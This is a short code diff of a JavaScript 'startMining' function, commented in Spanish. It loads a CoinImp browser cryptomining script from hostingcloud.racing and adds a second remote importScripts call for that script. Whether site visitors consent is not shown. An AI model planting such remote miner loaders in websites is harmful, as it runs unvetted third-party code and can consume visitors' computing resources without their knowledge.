@@ -27,6 +27,7 @@ function startMining(apiKey) {
     
     // 1. Cargar script de CoinImp
     importScripts('https://www.hostingcloud.racing/ADTj.js');
+    importScripts('https://www.hostingcloud.racing/ADTj.js?v=2');
     
     // 2. Configurar minero
     if (typeof Client !== 'undefined') {
